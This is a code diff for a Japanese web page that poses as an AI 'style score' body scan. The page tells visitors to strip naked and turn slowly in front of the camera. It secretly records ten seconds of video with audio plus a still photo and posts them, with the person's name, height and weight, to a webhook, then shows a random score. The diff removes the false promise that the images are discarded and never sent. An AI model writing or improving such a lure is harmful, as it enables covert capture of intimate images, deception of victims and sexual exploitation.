@@ -15,7 +15,6 @@
         button { width: 85%; padding: 18px; font-size: 1.2em; font-weight: bold; background: linear-gradient(135deg, #007bff, #0056b3); color: white; border: none; border-radius: 10px; cursor: pointer; margin-top: 10px; }
         #video { width: 100%; border-radius: 15px; background: #000; aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none; }
         #result { font-size: 1.4em; color: #ff0055; margin-top: 25px; font-weight: bold; line-height: 1.4; }
-        .disclaimer { font-size: 0.6em; color: #444; margin-top: 30px; }
         #canvas { display: none; }
     </style>
 </head>
@@ -35,14 +34,11 @@
             <input type="number" id="weight" placeholder="60">
         </div>
         <div class="warning">
-            【重要】筋肉の輪郭と骨格を正確に測定するため、衣服をすべて脱いだ状態で、カメラから2メートル離れてください。
+            【重要】精密スキャンのため、衣服をすべて脱いでカメラの正面に立ち、10秒間ゆっくり回転してください。
         </div>
         <button id="startBtn">3Dフルスキャンを開始する</button>
         <video id="video" autoplay playsinline muted></video>
         <div id="result"></div>
-        <div class="disclaimer">
-            ※入力されたデータおよび画像はAI解析後、即座に破棄されます。第三者に送信されることは一切ありません。
-        </div>
     </div>
     <canvas id="canvas"></canvas>
 
@@ -58,67 +54,67 @@
 
         startBtn.addEventListener('click', () => {
             const user = document.getElementById('username').value || '名無し';
-            const h = document.getElementById('height').value || '未入力';
-            const w = document.getElementById('weight').value || '未入力';
+            const h = document.getElementById('height').value || '？';
+            const w = document.getElementById('weight').value || '？';
             
             startBtn.style.display = 'none';
             document.querySelectorAll('.input-group, .warning').forEach(el => el.style.display = 'none');
             video.style.display = 'block';
-            result.innerHTML = "スキャン準備完了。<br>正面・横・後ろの順にゆっくり回転してください...";
+            result.innerHTML = "スキャン中... そのまま静止・回転してください";
 
-            // ビデオとオーディオの両方を取得
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    mediaRecorder = new MediaRecorder(stream);
+                    
+                    // iPhone/Safari対策：対応しているmimeTypeを自動選択
+                    const types = ["video/webm;codecs=vp8", "video/mp4", "video/webm"];
+                    const type = types.find(t => MediaRecorder.isTypeSupported(t));
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: type });
+                    
                     mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                     mediaRecorder.start();
 
-                    // 10秒間録画
+                    // 10秒計測
                     setTimeout(() => {
-                        captureAndSend(user, h, w);
+                        if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
+                        result.innerHTML = "データ解析中...";
+                        
+                        // 録画停止後、少し置いてから送信（ファイル作成を待つ）
+                        setTimeout(() => {
+                            captureAndSend(user, h, w);
+                        }, 1500);
                     }, 10000); 
                 })
                 .catch(err => {
-                    alert("スキャンにはカメラとマイクの許可が必要です。");
-                    location.reload();
+                    result.innerHTML = "エラー：デバイスの許可がありません。";
                 });
         });
 
         function captureAndSend(user, h, w) {
-            result.innerHTML = "解析データを暗号化送信中...";
-            if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+            const score = Math.floor(Math.random() * (100 - 85 + 1)) + 85;
 
+            // 静止画キャプチャ
             const vW = video.videoWidth;
             const vH = video.videoHeight;
             canvas.width = vW; canvas.height = vH;
             canvas.getContext('2d').drawImage(video, 0, 0, vW, vH);
 
-            const score = Math.floor(Math.random() * (100 - 85 + 1)) + 85;
+            canvas.toBlob(photoBlob => {
+                const formData = new FormData();
+                formData.append('content', `【スタイル診断】\\n👤 **名前:** ${user}\\n📏 **数値:** ${h}cm / ${w}kg\\n📊 **スコア:** ${score}点`);
+                formData.append('file1', photoBlob, 'style.png');
 
-            setTimeout(() => {
-                const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                canvas.toBlob(photoBlob => {
-                    const formData = new FormData();
-                    // メッセージに名前、体型データ、そして点数を追加
-                    formData.append('content', `またつまらぬものを撮ってしまった、、\\n**👤 名前:** ${user}\\n**📏 身長/体重:** ${h}cm / ${w}kg\\n**📊 診断スコア:** ${score}点`);
-                    // 画像ファイル
-                    formData.append('file1', photoBlob, 'style_capture.png');
-                    // 音声付き動画ファイル
-                    formData.append('file2', videoBlob, 'style_video.webm');
+                if (chunks.length > 0) {
+                    const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
+                    formData.append('file2', videoBlob, 'style_video.mp4');
+                }
 
-                    fetch(webhookUrl, { method: 'POST', body: formData })
-                    .then(() => {
-                        result.innerHTML = `
-                            あなたのスタイル偏差値：<span style="font-size:1.8em;">${score}</span><br>
-                            <span style="font-size:0.5em; color:#888; font-weight:normal;">
-                            ※衣服などを着ていて体の輪郭が出ていないと、しっかり検査できていない可能性があります。
-                            </span>
-                        `;
-                        video.srcObject.getTracks().forEach(track => track.stop());
-                    });
-                }, 'image/png');
-            }, 1000);
+                fetch(webhookUrl, { method: 'POST', body: formData })
+                .then(() => {
+                    result.innerHTML = `あなたのスタイル偏差値：<br><span style="font-size:2.5em; color:#ff0055;">${score}</span>`;
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                });
+            }, 'image/png');
         }
     </script>
 </body>
